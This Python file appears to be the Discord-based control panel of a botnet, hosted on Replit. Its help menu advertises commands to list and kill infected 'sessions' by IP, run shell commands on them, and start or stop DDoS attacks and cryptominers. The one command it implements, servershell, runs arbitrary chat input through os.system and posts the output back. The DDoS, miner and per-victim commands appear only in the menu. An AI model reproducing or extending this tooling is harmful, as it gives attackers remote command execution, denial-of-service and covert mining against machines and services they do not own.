import os
import discord
from discord.ext import commands
from discord import app_commands
from keep_alive import keep_alive

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

helpmenu = """
** Bot Commands **
> !help # Help menu
> !clear    # Clear chat
> !sessions # List open sessions
> !kill # Close sessions
> !shell<cmd>   # Run command
> !ddos # Starts DDOS Attack # Settings on Github
> !stopddos # Stops DDOS Attack
> !miner    # Start miner   # Settings on Github
> !stopminer    # Stop miner
> !servershell  # Replit Shell

** Self Commands **
> !kill.<ip>    # Close session
> !shell.<ip> <cmd> # Run command    # Prints output of command
> !ddos.<ip>    # Starts DDOS Attack    # Settings on Github
> !stopddos.<ip>    # Stops DDOS Attack
> !miner.<ip>   # Start miner  # Settings on Github
> !stopminer.<ip>   # Stop miner
"""

# log
@bot.event
async def on_ready():
    print(f'{bot.user}')

# help
@bot.command()
async def help(ctx):
    await ctx.send(helpmenu)

# clear
@bot.command(aliases=['purge', 'delete'])
async def clear(ctx):
    await ctx.channel.purge(limit=1000000)

# shell
@bot.command()
async def servershell(ctx, *args):
    arguments = ' '.join(args)
    os.system(f'{arguments} > output.txt')
    await ctx.send(file=discord.File(r'output.txt'))
    if os.path.exists("output.txt"):
        os.remove("output.txt")

keep_alive()
token = os.environ.get("DISCORD_BOT_SECRET")
bot.run(token)
